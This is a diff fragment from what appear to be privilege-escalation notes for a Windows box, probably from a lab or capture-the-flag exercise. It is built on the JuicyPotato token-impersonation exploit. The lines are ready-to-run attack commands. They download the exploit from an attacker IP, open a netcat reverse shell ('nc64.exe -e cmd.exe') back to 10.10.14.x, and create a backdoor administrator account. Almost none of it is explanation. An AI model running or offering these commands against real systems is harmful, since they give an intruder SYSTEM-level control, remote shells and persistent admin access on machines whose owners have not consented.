@@ -35,7 +35,7 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 
 (New-Object Net.Webclient).DownloadFile('http://10.10.14.15:8000/JuicyPotato.exe','JuicyPotato.exe'); IEX (Get-Content '.\JuicyPotato.exe' -raw)
 \\10.10.14.15\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c \\10.10.14.15\smbFolder\nc64.exe -e cmd.exe 10.10.14.15 9090" -t *
-JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe "/c C:\xampp\htdocs\user\images\nc64.exe -e cmd.exe 10.10.14.15 9090"
+.\JuicyPotato.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\windows\Temp\sec\nc64.exe -e cmd.exe 10.10.14.4 9090" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
 .\JuicyPotato.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user usuario 123456789a* /add" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
 .\JuicyPotato.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup Administrators usuario /add" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
 
